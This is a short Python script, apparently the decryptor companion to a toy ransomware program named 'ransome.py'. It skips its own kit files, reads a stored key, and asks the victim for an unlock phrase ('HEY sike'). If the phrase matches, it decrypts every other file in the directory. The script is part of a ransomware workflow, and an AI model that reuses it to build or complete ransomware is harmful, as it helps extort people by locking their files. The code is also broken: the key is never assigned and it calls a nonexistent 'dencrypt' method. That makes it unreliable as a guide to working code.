import os
from cryptography.fernet import Fernet
files=[]
for file in os.listdir():
    if file == "ransome.py" or file == "thekey.key" or file == "decrpt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)



with open("thekey.key","rb") as thekey:
    secretkey.key.read()

secretphrase="HEY sike"
user_phrase= input("Enter the phrase to unlock your files")

if user_phrase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_dencrypted = Fernet(secretkey).dencrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_dencrypted)
            print("Enjoy sir")
else:
    print("Wrong password sir")

